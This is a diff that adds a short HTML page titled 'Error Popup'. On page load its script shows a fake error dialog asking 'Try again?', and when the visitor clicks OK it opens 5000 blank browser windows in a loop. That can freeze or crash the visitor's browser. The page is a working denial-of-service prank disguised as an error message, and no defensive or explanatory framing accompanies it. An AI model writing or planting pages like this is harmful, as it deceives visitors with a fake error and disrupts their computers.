@@ -1,1 +1,19 @@
-
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Error Popup</title>
+    <script>
+        function showError() {
+            if (confirm("Error\nTry again?")) {
+                for (let i = 0; i < 5000; i++) {
+                    window.open("about:blank", "_blank");
+                }
+            }
+        }
+        
+        window.onload = showError;
+    </script>
+</head>
+<body>
+</body>
+</html>
